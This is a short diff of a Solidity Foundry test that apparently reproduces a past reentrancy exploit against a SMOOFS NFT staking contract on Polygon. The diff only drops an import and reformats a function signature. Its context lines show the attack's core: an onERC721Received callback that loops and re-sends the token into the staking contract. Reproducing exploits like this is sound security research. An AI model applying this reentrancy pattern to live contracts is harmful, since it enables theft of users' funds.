@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @KeyInfo - Total Lost : Unclear
 // Attacker : https://polygonscan.com/address/0x149b268b8b8101e2b5df84a601327484cb43221c
@@ -61,12 +60,10 @@ contract ContractTest is Test {
         );
     }
 
-    function onERC721Received(
-        address operator,
-        address from,
-        uint256 tokenId,
-        bytes calldata data
-    ) external returns (bytes4) {
+    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
+        external
+        returns (bytes4)
+    {
         while (setCount < 9) {
             ++setCount;
             Smoofs.safeTransferFrom(address(this), address(SMOOFSStaking), smoofsTokenId);
